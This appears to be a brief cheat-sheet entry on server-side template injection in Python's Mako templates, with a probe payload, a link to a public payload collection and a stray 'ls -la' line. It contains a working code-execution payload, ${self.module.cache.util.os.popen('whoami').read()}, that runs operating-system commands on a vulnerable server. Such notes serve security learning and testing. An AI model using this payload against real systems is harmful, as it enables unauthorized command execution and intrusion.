# Template Injection Python

If there is no sanitizaiton in Python we can do a Template Injection when e.g. Mako Template for Python is used

Python executes arbitary code when not sanitized as followed: 

```python 
// command injection via keyword 

${ here the operation }
e.g. ${7*7}

${self.module.cache.util.os.popen('whoami').read()}

```

[SSTI Tools and Co.](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)


ls -la <-- to list all